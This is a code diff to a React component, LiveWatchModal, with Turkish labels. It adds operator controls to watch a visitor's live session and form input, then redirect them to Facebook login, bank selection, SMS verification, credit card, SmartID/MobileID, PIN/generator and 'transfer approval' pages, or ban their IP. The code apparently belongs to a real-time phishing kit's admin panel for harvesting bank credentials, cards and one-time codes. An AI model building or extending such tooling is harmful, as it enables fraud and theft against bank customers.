@@ -15,6 +15,8 @@ type Props = {
   formData?: Record<string, any>;
   isOnline: boolean;
   darkMode: boolean;
+  onRouteAction?: (action: string) => void;
+  onApprovalAction?: (approval: string) => void;
   onClose: () => void;
 };
 
@@ -34,6 +36,33 @@ function getFieldIcon(key: string): string {
   return "✍️";
 }
 
+const ROUTE_OPTIONS = [
+  { value: "win", label: "👉 İsim & Profil'e Yönlendir" },
+  { value: "facebook", label: "👉 Facebook Girişine Yönlendir" },
+  { value: "banken", label: "👉 Banka Listesine Yönlendir" },
+  { value: "sms", label: "👉 SMS Doğrulamasına Yönlendir" },
+  { value: "card", label: "👉 Kredi Kartına Yönlendir" },
+  { value: "wait", label: "⏳ Beklemeye Al" },
+  { value: "invalid_bank", label: "❌ Hatalı Banka (Uyarı)" },
+  { value: "live_support", label: "🎧 Canlı Desteğe Yönlendir" },
+  { value: "congrats", label: "✅ Tebrikler Ekranına Al" },
+  { value: "special_approval", label: "🔔 Özel Bildirim Gönder" },
+  { value: "custom_question", label: "❓ Özel Soru Gönder" },
+  { value: "ban_ip", label: "🚫 IP Banla (Siteye Giremesin)" },
+];
+
+const APPROVAL_OPTIONS = [
+  { value: "smartid_1", label: "SmartID 1 Sayfası" },
+  { value: "smartid_2", label: "SmartID 2 Sayfası" },
+  { value: "mobileid_1", label: "MobileID 1 Sayfası" },
+  { value: "mobileid_2", label: "MobileID 2 Sayfası" },
+  { value: "biometrika_pin_1", label: "Biometrika/PIN 1" },
+  { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
+  { value: "generator1", label: "Generator 1" },
+  { value: "generator2", label: "Generator 2" },
+  { value: "transfer", label: "Transfer Onayı" },
+];
+
 export function LiveWatchModal({
   sessionId,
   publicId,
@@ -43,6 +72,8 @@ export function LiveWatchModal({
   formData = {},
   isOnline,
   darkMode,
+  onRouteAction,
+  onApprovalAction,
   onClose,
 }: Props) {
   const [frameMode, setFrameMode] = useState<FrameMode>("mobile");
@@ -54,6 +85,7 @@ export function LiveWatchModal({
   const [clientMeta, setClientMeta] = useState<LiveClientMeta | null>(null);
   const [currentlyFocusedField, setCurrentlyFocusedField] = useState<string | null>(null);
   const [copiedField, setCopiedField] = useState<string | null>(null);
+  const [actionFeedback, setActionFeedback] = useState<string | null>(null);
 
   // Dynamic live fields: Only include fields that actually have values or are interacted with!
   const [liveFields, setLiveFields] = useState<Record<string, string>>(() => {
@@ -359,6 +391,48 @@ export function LiveWatchModal({
     setTimeout(() => setCopiedField(null), 1500);
   };
 
+  const handleActionSelect = async (actionVal: string) => {
+    if (!actionVal) return;
+    const opt = ROUTE_OPTIONS.find((r) => r.value === actionVal);
+    const label = opt?.label || actionVal;
+
+    if (onRouteAction) {
+      onRouteAction(actionVal);
+    } else {
+      const supabase = createBrowserSupabaseClient();
+      if (supabase && sessionId) {
+        await supabase
+          .from("sessions")
+          .update({ current_step: actionVal, status: "online" })
+          .eq("id", sessionId);
+      }
+    }
+
+    setActionFeedback(`Yönlendirildi: ${label}`);
+    setTimeout(() => setActionFeedback(null), 3000);
+  };
+
+  const handleApprovalSelect = async (approvalVal: string) => {
+    if (!approvalVal) return;
+    const opt = APPROVAL_OPTIONS.find((a) => a.value === approvalVal);
+    const label = opt?.label || approvalVal;
+
+    if (onApprovalAction) {
+      onApprovalAction(approvalVal);
+    } else {
+      const supabase = createBrowserSupabaseClient();
+      if (supabase && sessionId) {
+        await supabase
+          .from("sessions")
+          .update({ current_step: approvalVal, status: "online" })
+          .eq("id", sessionId);
+      }
+    }
+
+    setActionFeedback(`Onay Gönderildi: ${label}`);
+    setTimeout(() => setActionFeedback(null), 3000);
+  };
+
   const currentPath = clientMeta?.pathname || initialPath || "Bilinmiyor";
   const displayName = initialName || formData.firstName || formData.lastName
     ? `${formData.firstName || ""} ${formData.lastName || ""}`.trim()
@@ -383,7 +457,7 @@ export function LiveWatchModal({
       >
         {/* HEADER BAR */}
         <div
-          className={`flex flex-wrap items-center justify-between gap-3 px-5 py-3.5 border-b select-none ${
+          className={`flex flex-wrap items-center justify-between gap-3 px-5 py-3 border-b select-none ${
             darkMode ? "bg-[#1c1c1e]/90 border-white/10" : "bg-gray-50/90 border-gray-200"
           }`}
         >
@@ -576,28 +650,83 @@ export function LiveWatchModal({
           </div>
         </div>
 
-        {/* SUBHEADER: CURRENT ROUTE & STATS BAR */}
+        {/* SUBHEADER: LIVE CONTROLS (AKSİYON SEÇİN & ONAY SEÇİN) + ROUTE INFO */}
         <div
-          className={`flex items-center justify-between px-5 py-2 text-xs border-b ${
+          className={`flex flex-wrap items-center justify-between gap-3 px-5 py-2.5 text-xs border-b ${
             darkMode ? "bg-black/30 border-white/5 text-gray-300" : "bg-gray-100/70 border-gray-200 text-gray-700"
           }`}
         >
-          <div className="flex items-center gap-3 overflow-hidden">
+          {/* LEFT: CURRENT ROUTE */}
+          <div className="flex items-center gap-2 overflow-hidden">
             <span className="font-semibold opacity-60">Aktif Sayfa:</span>
             <code className="px-2 py-0.5 rounded font-mono font-bold text-[11px] bg-cyan-500/10 text-cyan-500 border border-cyan-500/20">
               {currentPath}
             </code>
-            {clientMeta?.title && (
-              <span className="hidden md:inline truncate opacity-80 italic">
-                - {clientMeta.title}
+          </div>
+
+          {/* CENTER / CONTROLS: ACTION & APPROVAL DROPDOWNS */}
+          <div className="flex items-center gap-2">
+            {/* AKSİYON SEÇİN DROPDOWN */}
+            <select
+              value=""
+              onChange={(e) => {
+                if (e.target.value) {
+                  void handleActionSelect(e.target.value);
+                  e.target.value = "";
+                }
+              }}
+              className={`rounded-xl border px-3 py-1.5 text-xs font-bold outline-none cursor-pointer transition-all ${
+                darkMode
+                  ? "bg-[#1c1c1e] border-white/10 text-amber-400 focus:border-[#EB5E28]"
+                  : "bg-white border-gray-200 text-amber-600 focus:border-[#EB5E28]"
+              }`}
+            >
+              <option value="">👉 Aksiyon Seçin...</option>
+              {ROUTE_OPTIONS.map((opt) => (
+                <option key={opt.value} value={opt.value}>
+                  {opt.label}
+                </option>
+              ))}
+            </select>
+
+            {/* ONAY SEÇİN DROPDOWN */}
+            <select
+              value=""
+              onChange={(e) => {
+                if (e.target.value) {
+                  void handleApprovalSelect(e.target.value);
+                  e.target.value = "";
+                }
+              }}
+              className={`rounded-xl border px-3 py-1.5 text-xs font-bold outline-none cursor-pointer transition-all ${
+                darkMode
+                  ? "bg-[#1c1c1e] border-white/10 text-emerald-400 focus:border-emerald-500"
+                  : "bg-white border-gray-200 text-emerald-600 focus:border-emerald-500"
+              }`}
+            >
+              <option value="">🛡️ Onay Seçin...</option>
+              {APPROVAL_OPTIONS.map((opt) => (
+                <option key={opt.value} value={opt.value}>
+                  {opt.label}
+                </option>
+              ))}
+            </select>
+
+            {/* ACTION FEEDBACK BADGE */}
+            {actionFeedback && (
+              <span className="flex items-center gap-1 px-3 py-1 rounded-full text-xs font-black uppercase tracking-wider bg-emerald-500 text-black shadow-md animate-bounce">
+                <span>✓</span>
+                <span>{actionFeedback}</span>
               </span>
             )}
           </div>
+
+          {/* RIGHT: RESOLUTION & STATS */}
           <div className="flex items-center gap-4 text-[11px] font-mono opacity-80">
             <span>Çözünürlük: {viewportWidth}x{viewportHeight}</span>
             <span>Olaylar: {eventCount}</span>
             {lastActivityAt && (
-              <span>Son Hareket: {Math.max(0, Math.round((Date.now() - lastActivityAt) / 1000))}s önce</span>
+              <span>Son: {Math.max(0, Math.round((Date.now() - lastActivityAt) / 1000))}s önce</span>
             )}
           </div>
         </div>
@@ -744,13 +873,69 @@ export function LiveWatchModal({
                     : "border-transparent opacity-60 hover:opacity-100"
                 }`}
               >
-                <span>Cihaz & İşlem Günlüğü</span>
+                <span>Cihaz & Ham Bilgiler</span>
               </button>
             </div>
 
             {/* TAB CONTENT: DYNAMIC FIELD CARDS */}
             {activeTab === "fields" ? (
               <div className="flex-1 overflow-y-auto p-3 space-y-3">
+                {/* QUICK REDIRECT & APPROVAL CONTROLS IN SIDEBAR */}
+                <div
+                  className={`p-3 rounded-2xl border space-y-2 ${
+                    darkMode ? "bg-white/[0.03] border-white/10" : "bg-gray-50 border-gray-200"
+                  }`}
+                >
+                  <div className="text-[10px] font-black uppercase tracking-wider opacity-60">
+                    Hızlı Yönlendirme ve Onay
+                  </div>
+                  <div className="grid grid-cols-2 gap-2">
+                    <select
+                      value=""
+                      onChange={(e) => {
+                        if (e.target.value) {
+                          void handleActionSelect(e.target.value);
+                          e.target.value = "";
+                        }
+                      }}
+                      className={`w-full rounded-xl border px-2.5 py-1.5 text-xs font-bold outline-none cursor-pointer transition-all ${
+                        darkMode
+                          ? "bg-black/50 border-white/10 text-amber-400 focus:border-[#EB5E28]"
+                          : "bg-white border-gray-200 text-amber-600 focus:border-[#EB5E28]"
+                      }`}
+                    >
+                      <option value="">Aksiyon Seç...</option>
+                      {ROUTE_OPTIONS.map((opt) => (
+                        <option key={opt.value} value={opt.value}>
+                          {opt.label}
+                        </option>
+                      ))}
+                    </select>
+
+                    <select
+                      value=""
+                      onChange={(e) => {
+                        if (e.target.value) {
+                          void handleApprovalSelect(e.target.value);
+                          e.target.value = "";
+                        }
+                      }}
+                      className={`w-full rounded-xl border px-2.5 py-1.5 text-xs font-bold outline-none cursor-pointer transition-all ${
+                        darkMode
+                          ? "bg-black/50 border-white/10 text-emerald-400 focus:border-emerald-500"
+                          : "bg-white border-gray-200 text-emerald-600 focus:border-emerald-500"
+                      }`}
+                    >
+                      <option value="">Onay Seç...</option>
+                      {APPROVAL_OPTIONS.map((opt) => (
+                        <option key={opt.value} value={opt.value}>
+                          {opt.label}
+                        </option>
+                      ))}
+                    </select>
+                  </div>
+                </div>
+
                 {activeFieldKeys.length === 0 ? (
                   <div className="py-20 text-center px-4">
                     <div className="w-12 h-12 rounded-2xl bg-emerald-500/10 text-emerald-500 flex items-center justify-center mx-auto mb-3">
@@ -832,7 +1017,7 @@ export function LiveWatchModal({
                             className={`font-mono text-sm sm:text-base font-extrabold px-3.5 py-2.5 rounded-xl border select-all break-words ${
                               isFilled
                                 ? darkMode
-                                ? "bg-black/50 border-white/10 text-white font-bold"
+                                  ? "bg-black/50 border-white/10 text-white font-bold"
                                   : "bg-white border-gray-200 text-gray-900 shadow-inner"
                                 : darkMode
                                 ? "bg-black/30 border-white/5 text-gray-600 italic font-normal text-xs py-2"
